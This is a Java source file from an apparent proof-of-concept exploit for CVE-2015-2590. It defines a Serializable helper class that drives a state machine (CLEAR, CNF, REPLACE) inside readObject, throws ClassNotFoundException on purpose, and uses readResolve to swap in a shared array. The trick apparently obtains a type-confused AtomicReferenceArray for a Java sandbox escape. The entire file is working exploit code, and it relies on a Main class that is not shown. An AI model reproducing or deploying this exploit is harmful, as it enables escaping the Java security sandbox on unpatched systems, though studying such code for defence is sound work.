package poc.cve_2015_2590;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.concurrent.atomic.AtomicReferenceArray;

public class StreamHelper implements Serializable {
	
	private static final long serialVersionUID = 6962911320051120347L;
	public static final int NUM_CHILDREN = 100;
	
	private static enum State {
		CLEAR,
		CNF,
		REPLACE
	}
	
	private static State CUR_STATE = State.CLEAR;
	
	public static void reset( ) {
		StreamHelper.CUR_STATE = State.CLEAR;
	}
	
	private Object dummyObject;

	public Object readResolve( ) {
		return Main.ARR;
	}
	
	@SuppressWarnings("unchecked")
	private void readObject( ObjectInputStream ois ) throws IOException, ClassNotFoundException {
		switch( StreamHelper.CUR_STATE ) {
			case CLEAR:
				Main.ARA = ( AtomicReferenceArray< Object > ) ois.readObject( );
				
				StreamHelper.CUR_STATE = State.CNF;
				for( int i = 0; i < NUM_CHILDREN + 1; i++ ) {
					try {
						ois.readObject( );
					}
					catch( Throwable t ) { }
				}
				StreamHelper.CUR_STATE = State.REPLACE;
				break;
			case CNF:
				throw new ClassNotFoundException( );
			case REPLACE:
				return;
		}
	}

	private void writeObject( ObjectOutputStream out ) throws IOException { }

}
